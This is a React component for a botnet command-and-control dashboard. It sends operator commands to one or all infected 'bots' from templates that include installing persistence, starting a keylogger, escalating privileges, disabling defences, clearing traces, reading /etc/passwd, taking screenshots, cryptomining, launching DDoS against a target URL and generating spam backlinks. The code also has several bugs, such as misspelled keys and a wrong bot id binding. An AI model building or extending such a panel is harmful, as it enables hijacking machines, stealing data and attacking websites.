import React, {useEffect, useState} from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
    Play,
    Terminal, 
    StopCircle,
    History,
    Code2,
    Network,
    Database,
    Shield,
    TrendingUp,
    Cpu,
    RefreshCw,
    Filter,
    Search,
    Code
} from 'lucide-react'
import { apiUtils, commandAPI, botApi } from '../../utils/api'


const CommandCenter = () => {
    const [selectedCommand, setSelectedCommand] = useState('');
    const [commandHistory, setCommandHistory] = useState([]);
    const [selectedBot, setSelectedBot] = useState('all');
    const [bots, setBots] = useState([]);
    const [isLoading, setIsLoading] = useState(false);
    const [commandType, setCommandType] = useState('system');
    const [parameters, setParameters] = useState({});

    const commandTemplates = {
        system: [
            {name: 'Get System Info', command: 'system_info', parameters: {}},
            {name: 'List Processes', command: 'list_processes', parameters: {}},
            {name: 'Disk Usage', command: 'disk_usage', parameters: {}},
            {name: 'Install Persistence', command: 'install_persistence', parameters: {}},
        ],
        network: [
            {name: 'Port Scan', command: 'port_scan', parameters: {target: '192.168.1.1', ports: '1-1000'}},
            {name: 'Network Discovery', command: 'network_discovery', parameters: {subnet: '192.168.1.0/24'}},
            {name: 'Trace Route', command: 'traceroute', parameters: {target: 'google.com'}},
        ],
        data: [
            {name: 'List Files', command: 'file_list', parameters: {directory: '.'}},
            {name: 'Read File', command: 'file_read', parameters: {filepath: '/etc/passwd'}},
            {name: 'Take Screenshot', command: 'screenshot', parameters: {}},
            {naem: 'Start Keylogger', commad: 'keylogger_start', parameters: {duration: 300}},
        ],
        special: [
            {name: 'Elevate Priveleges', command: 'elevate_priveleges', parameters: {}},
            {name: 'Disable Defenses', command: 'disable_defenses', parameters: {}},
            {name: 'Clean Traces', command: 'clean_traces', parameters: {}},
        ],
        mining: [
            {name: 'Start Mining', command: 'start_mining', parameters: {algorithm: 'cryptonight', intensity: 50}},
            {name: 'Stop Mining', command: 'stop_mining', parameters: {}},
        ],
        ddos: [
            {name: 'Start DDoS', command: 'start_ddos', parameters: {target_url: 'http://target.com', duration: 60, threads: 10}},
            {name: 'Stop DDoS', command: 'stop_ddos', parameters: {}},
        ],
        seo: [
            {name: 'Analyze Website SEO', command: 'analyze_seo', parameters: {url: 'https://target.com'}},
            {name: 'Generate Traffic', command: 'analyze_seo', parameters: {target_url: 'https://target.com', visitors: 100}},
            {name: 'Create Backlinks', command: 'create_backlinks', parameters: {target_url: 'https://target.com', count: 50}},
        ]
    };

    useEffect(() => {
        fetchBots();
        fetchCommandHIstory();
    }, []);

    const fetchBots = async () => {
        try {
            const response = await botApi.getOnline();
            setBots(response.data.results || response.data);
        } catch (error) {
            console.error('Failed to load bots: ', error);
        }
    };
    
    const fetchCommandHIstory = async () => {
        try {
            const response = await commandAPI.getAll({ ordering: '-created_at'});
            setCommandHistory(response.data.results || response.data);
        } catch (error) {
            console.error('Failed to fetch command history: ', error);
        }
    };

    const executeCommand = async () => {
        if (!selectedCommand) return;
        setIsLoading(true);

        try {
            const commandData = {
                command_name: selectedCommand,
                command_type: commandType,
                parameters: parameters
            }

            let response
            if (selectedBot === 'all') {
                for (const bot of bots) {
                    response = await botApi.executeCommand(bot.id, commandData);
                }
            } else {
                response = await botApi.executeCommand(selectedBot ,commandData);
            }

            if (response) {
                setSelectedCommand('');
                setParameters({});
                fetchCommandHIstory(); // refresh history

            }
        } catch (error) {
            console.error('Failed to execute command: ',error);
        } finally {
            setIsLoading(false);
        }
    };

    const handleTemplateSelect = (template) => {
        setSelectedCommand(template.commad);
        setParameters(template.parameters);
    };

    const CommandCategory = ({icon: Icon, title, commands, color}) => (
        <motion.div
            initial={{ opacity: 0, y: 20}}
            animate={{ opacity: 1, y: 0}}
            className='bg-gray-800 rounded-xl p-6 border border-gray-700'
        >
            <div className="flex items-center space-x-3 mb-4">
                <div className="p-2 rounded-lg" style={{ backgroundColor: color + '20'}}>
                    <Icon size={20} style={{ color }}></Icon>
                </div>
                <h3 className="text-lg font-semibold">{title}</h3>
            </div>

            <div className="space-y-2">
                {commands.map((cmd, index) => (
                    <motion.div
                        key={index}
                        whileHover={{ x: 5}}
                        whileTap={{ scale: 0.95}}
                        onClick={() => handleTemplateSelect(cmd)}
                        className='w-full text-left p-3 rounded-lg bg-gray-700 hover:bg-gray-600 transition-colors'
                    >
                        <div className="font-medium">{cmd.name}</div>
                        <div className="text-sm text-gray-400 font-mono">{cmd.command}</div>
                        {Object.keys(cmd.parameters).length > 0 && (
                            <div className="text-xs text-gray-500 mt-1">
                                Params: {JSON.stringify(cmd.parameters)}
                            </div>
                        )}
                    </motion.div>
                ))}
            </div>
        </motion.div>
    );

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 py-12">
        <div className="max-w-6xl mx-auto p-6 space-y-6">
            <motion.div
                initial={{ opacity: 0, y: -20}}
                animate={{ opacity: 1, y: 0}}
                className='flex justify-between items-center'
            >
                <div>
                    <h1 className="text-3xl font-bold">Command Center</h1>
                    <p className="text-gray-400">Execute commands across your bot network</p>
                </div>
                <motion.button
                    whileHover={{ scale: 1.05}}
                    whileTap={{ scale: 0.95}}
                    onClick={fetchCommandHIstory}
                    className='px-4 py-2 bg-gray-700 rounded-lg font-semibold flex items-center space-x-2'
                >
                    <RefreshCw size={20}></RefreshCw>
                    <span>Refresh</span>
                </motion.button>
            </motion.div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* Command Input */}
                <motion.div
                    initial={{ opacity: 0, x: -20}}
                    animate={{ opacity: 1, x: 0}}
                    className='bg-gray-800 rounded-xl p-6 border border-gray-700'
                >
                    <h3 className="text-lg font-semibold mb-4">Execute Command</h3>

                    <div className="space-y-4">
                        {/* Target Selection */}
                        <div>
                            <label className='block text-sm font-medium text-gray-400 mb-2'>
                                Target Bot
                            </label>
                            <select
                                value={selectedBot}
                                onChange={(e) => setSelectedBot(e.target.value)}
                                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
                            >
                                <option value='all'>All Online Bots ({bots.length})</option>
                                {bots.map(bot => (
                                    <option key={bot.id} value={bots.id}>
                                        {bot.hostname} ({bot.platform})
                                    </option>
                                ))}
                            </select>
                        </div>

                        {/* Command Type */}
                        <div>
                            <label className='block text-sm font-medium text-gray-400 mb-2'>
                                Command Type
                            </label>
                            <select
                                value={commandType}
                                onChange={(e) => setCommandType(e.target.value)}
                                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
                            >
                                <option value='system'>System Commands</option>
                                <option value='network'>Network Commands</option>
                                <option value='special'>Special Operations</option>
                                <option value='data'>Data Collection</option>
                                <option value='mining'>Mining Operations</option>
                                <option value='ddos'>DDoS Attacks</option>
                                <option value='seo'>SEO Operations</option>
                            </select>
                        </div>

                        {/* Command Input */}
                        <div>
                            <label className='block text-sm font-medium text-gray-400 mb-2'>
                                Command
                            </label>
                            <input
                                type='text'
                                value={selectedCommand}
                                onChange={(e) => setSelectedCommand(e.target.value)}
                                placeholder='Enter command or select from templates...'
                                className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 font-mono'
                            ></input>
                        </div>

                        {/* Parameters  */}
                        <div>
                            <label className='block text-sm font-medium text-gray-400 mb-2'>
                                Parameters (JSON)
                            </label>
                            <textarea
                                value={JSON.stringify(parameters, null, 2)}
                                onChange={(e) => {
                                    try {
                                        setParameters(JSON.parse(e.target.value))
                                    } catch (error) {
                                        // Invalid JSON, keep previous parameters
                                    }
                                }}
                                placeholder='Enter parameters as JSON...'
                                className='w-full h-32 p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 font-mono text-sm'
                            ></textarea>
                        </div>

                        <motion.button
                            whileHover={{ scale: 1.02}}
                            whileTap={{ scale: 0.98}}
                            onClick={executeCommand}
                            disabled={!selectedCommand || isLoading}
                            className='w-full py-3 bg-cyan-600 rounded-lg font-semibold flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed'
                        >
                            {isLoading ? (
                                <RefreshCw size={20} className='animate-spin'></RefreshCw>
                            ): (
                                <Play size={20}></Play>
                            )}
                            <span>
                                {isLoading ? 'Executing...' : 'Execute Command'}
                                {selectedBot === 'all' && 'on All Bots'}
                            </span>
                        </motion.button>
                    </div>
                </motion.div>

                {/* Command History */}
                <motion.div
                    initial={{ opacity: 0, x: 20}}            
                    animate={{ opacity: 1, x:0}}
                    className='bg-gray-800 rounded-xl p-6 border border-gray-700'
                >
                    <div className="flex items-center justify-between mb-4">
                        <h3 className="text-lg font-semibold">Command History</h3>
                        <History size={20} className='text-gray-400'></History>
                    </div>

                    <div className="space-y-3 max-h-96 overflow-y-auto">
                        {commandHistory.map((cmd) => (
                            <motion.div
                                key={cmd.id}
                                initial={{ opacity: 0, scale: 0.9}}
                                animate={{ opacity: 1, scale: 1}}
                                className='p-3 bg-gray-700 rounded-lg hover:bg-gray-600 transition-colors cursor-pointer'
                                onClick={() => {
                                    setSelectedCommand(cmd.command_name)
                                    setCommandType(cmd.command_type)
                                    setParameters(cmd.parameters)
                                }}
                            >
                                <div className="flex justify-between items-start mb-2">
                                    <div>
                                        <div className="font-medium">{cmd.command_name}</div>
                                        <div className="text-sm text-gray-400">
                                            {cmd.bot_info?.hostname} • {apiUtils.formatCommandStatus(cmd.status)}
                                        </div>
                                    </div>
                                    <span className={`text-xs px-2 py-1 rounded ${
                                        cmd.status === 'completed'
                                            ? 'bg-green-500/20 text-green-500'
                                            : cmd.status === 'failed'
                                            ? 'bg-red-500/20 text-red-500'
                                            : 'bg-yellow-500/20 text-yellow-500'
                                    }`}>
                                        {apiUtils.formatCommandStatus(cmd.status)}
                                    </span>
                                </div>

                                <div className="text-xs text-gray-400 mb-2">
                                    Type: {cmd.cammand_type} • {new Date(cmd.created_at).toLocaleTimeString()}
                                </div>

                                {cmd.output_preview && cmd.output_preview !== 'No output' && (
                                    <div className="mt-2 pt-2 bg-gray-600 rounded text-sm font-mono">
                                        {cmd.output_preview}
                                    </div>
                                )}
                            </motion.div>
                        ))}

                        {commandHistory.length === 0 && (
                            <div className="text-center text-gray-400 py-8">
                                <Terminal size={49} className='mx-auto mb-2 opacity-50'></Terminal>
                                <p>No commands executed yet</p>
                            </div>
                        )}
                    </div>
                </motion.div>
            </div>

            {/* command Templates */}
            <motion.div
                initial={{ opacity: 0, y: 20}}
                animate={{ opacity: 1 ,y: 0}}
            >
                <h3 className="text-xl font-semibold mb-4">Command Templates</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                    <CommandCategory
                        icon={Code2}
                        title='System'
                        commands={commandTemplates.system}
                        color='#00c49f'
                    ></CommandCategory>
                    <CommandCategory
                        icon={Network}
                        title='Network'
                        commands={commandTemplates.network}
                        color='#0088fe'
                    ></CommandCategory>
                    <CommandCategory
                        icon={Database}
                        title='Data'
                        commands={commandTemplates.data}
                        color='#ffbbfe'
                    ></CommandCategory>
                    <CommandCategory
                        icon={Shield}
                        title='Special Ops'
                        commands={commandTemplates.special}
                        color='#ff8042'
                    ></CommandCategory>
                    <CommandCategory
                        icon={Cpu}
                        title='Mining'
                        commands={commandTemplates.mining}
                        color='#ff6b6b'
                    ></CommandCategory>
                    <CommandCategory
                        icon={TrendingUp}
                        title='DDoS'
                        commands={commandTemplates.ddos}
                        color='#ffa726'
                    ></CommandCategory>
                    <CommandCategory
                        icon={TrendingUp}
                        title='SEO'
                        commands={commandTemplates.seo}
                        color='#8884d8'
                    ></CommandCategory>                                                                                
                </div>
            </motion.div>
        </div>
    </div>
  );
};

export default CommandCenter;